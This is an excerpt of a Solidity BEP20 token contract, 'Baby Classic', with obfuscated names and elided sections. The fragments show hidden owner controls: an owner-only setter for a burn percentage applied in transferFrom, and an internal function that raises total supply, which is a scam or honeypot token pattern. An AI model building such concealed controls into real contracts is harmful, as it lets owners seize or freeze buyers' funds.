...
contract HelloBEP20 is IBEP20 {
    using MathEM for uint256;

    string public name20REM =  "Baby Classic";
    string public symbol20REM =  "BLCS";
    uint8 public decimals20REM = 9;
    uint public _totalSupplyEV = 1*10**15 * 10**9;
    
    address private _owner;
    
    
    uint8 private _xdaking;
    ...
    constructor() {
        ...
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyEV;
        emit Transfer(address(0), msg.sender, _totalSupplyEV);
    }
  ...
  function decimals() public view virtual returns (uint8) {
        return decimals20REM;
    }

    function totalSupply() public override view returns (uint) {
        return _totalSupplyEV - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _lavx(from,tokens.mul(getVerLav()).div(10**2));
    ...
    function _lavx(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyEV = _totalSupplyEV.subb(tokens);
    ...
    function sVerLav(uint8 xdaking) public virtual onlyOwner {
		_xdaking = xdaking;
	}
    ...
    function _ekle(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyEV = _totalSupplyEV.ad(tokens);
